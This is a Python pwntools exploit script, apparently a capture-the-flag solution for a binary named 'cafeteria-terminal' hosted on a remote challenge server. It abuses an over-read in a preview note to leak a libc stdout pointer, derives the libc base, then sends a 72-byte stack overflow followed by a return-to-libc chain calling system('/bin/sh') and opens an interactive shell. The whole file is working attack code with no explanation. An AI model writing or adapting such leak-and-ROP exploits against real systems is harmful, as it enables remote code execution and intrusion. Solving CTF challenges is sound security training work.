from pwn import *

context.binary = elf = ELF("cafeteria-terminal")
libc = ELF("libc-2.31.so")

context.arch = "amd64"

OFFSET = 72

POP_RDI_RET = 0x4011FA
RET = 0x40120F

io = remote("chal.thuctf.redbud.info", 35003)

io.recvuntil(b"Do you want to check the live pickup queue screen? (y/n)")
io.recvuntil(b"> ")
io.sendline(b"y")
io.recvuntil(b"Type a short preview note for the screen.")
io.recvuntil(b"> ")
io.send(b"A" * 0x20)

io.recvuntil(b"The preview printer sputters and dumps extra bytes:\n")
leak = io.recvn(0x28)
stdout_leak = u64(leak[-8:])
libc.address = stdout_leak - libc.sym["_IO_2_1_stdout_"]
log.success(f"stdout@libc: {hex(stdout_leak)}")
log.success(f"libc base: {hex(libc.address)}")

io.recvuntil(b"Enter a short note for the advance pickup printer.")
io.recvuntil(b"> ")

binsh = next(libc.search(b"/bin/sh\x00"))
payload = flat(
    b"A" * OFFSET,
    RET,
    POP_RDI_RET,
    binsh,
    libc.sym["system"],
    libc.sym["exit"],
)
io.send(payload)

io.interactive()